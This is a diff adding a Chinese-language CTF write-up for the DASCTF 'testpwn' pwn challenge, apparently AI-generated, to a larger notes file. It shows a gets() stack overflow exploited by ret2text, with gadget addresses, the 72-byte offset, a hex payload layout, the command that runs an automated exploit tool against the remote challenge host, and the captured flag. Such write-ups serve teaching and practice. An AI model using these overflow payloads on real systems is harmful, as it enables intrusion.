@@ -1,4 +1,4 @@
----
+﻿---
 AIGC:
   ContentProducer: '001191110102MAD55U9H0F10002'
   ContentPropagator: '001191110102MAD55U9H0F10002'
@@ -5043,6 +5043,85 @@ systemctl list-unit-files --state=enabled
 > AI生成
 
 ---
+## 第28题：PWN - testpwn (Warm Up) — SSL + ret2text 自动化利用
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 类型 | PWN |
+| 题目 | testpwn (Warm Up) |
+| 来源 | DASCTF |
+| 靶机 | `ncat --ssl 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com 9999` |
+| Flag | `CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}` |
+
+### 解题过程
+
+#### 1. 关键发现：靶机使用 SSL/TLS
+
+靶机地址以 `.tcp-ctf2.dasctf.com` 结尾，平台提示连接方式为 `ncat --ssl`，说明服务端使用 SSL/TLS 加密。pwntools 的 `remote()` 默认不走 TLS，需要加 `ssl=True` 参数。
+
+#### 2. 静态分析（PWN Arcanum 自动完成）
+
+```
+Arch: amd64 (64-bit, little)
+NX: False    Canary: False    PIE: False    RELRO: Partial
+
+危险函数: gets@0x400500, sprintf@0x400510
+Win函数: system@0x4004d0
+Cat-flag gadget: mov edi, 0x400734 [cat flag] @ 0x400611
+自动偏移: 72 bytes (lea rdi,[rbp-0x48] + call gets)
+ROP gadgets: pop rdi; ret @0x400713, ret @0x4004a1
+```
+
+#### 3. 自动策略推荐
+
+工具自动推荐 ret2text（优先级95）：发现内联 `system("cat flag")` 在 `0x400611`。
+
+#### 4. 自动 payload 构建
+
+```
+ret2text: overflow 72 bytes -> call cat_flag_gadget@0x400611
+Payload: 96 bytes
+  0000: 41*72 (padding) + a1 04 40 00 (ret对齐) + 11 06 40 00 (gadget) + ef be ad de (fake ret)
+```
+
+#### 5. 远程利用（SSL模式）
+
+```bash
+python pwn_arcanum.py testpwn --remote 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com:9999 --ssl --no-interactive
+```
+
+输出：
+```
+Banner: -Warm Up-
+Sending payload (96 bytes) ...
+cat-flag gadget detected, waiting for output ...
+
+Output:
+WOW:0x40060d
+>CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
+timeout: the monitored command dumped core
+
+[FLAG] CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
+```
+
+### 知识点
+
+1. **DASCTF 平台 SSL 靶机**：域名含 `.tcp-ctf2.` 的靶机需要 `ncat --ssl` 或 pwntools `ssl=True`
+2. **ret2text + cat flag gadget**：gets 栈溢出覆盖返回地址，跳转到 `system("cat flag")`
+3. **ret 对齐**：x64 ABI 要求 16 字节栈对齐，在 gadget 前加一个 `ret` 指令
+4. **gets 需要 \n**：pwntools 用 `sendline()` 而非 `send()`，因为 `gets()` 读到 `\n` 才返回
+
+### 工具
+
+- PWN Arcanum v1.3：`PWN/pwn-arcanum/pwn_arcanum.py`
+- 一键复现：`python pwn_arcanum.py testpwn --remote HOST:PORT --ssl --no-interactive`
+
+> AI生成
+
+---
+
 
 ## 附录：自动化 Linux 应急响应扫描器（通用工具）
 
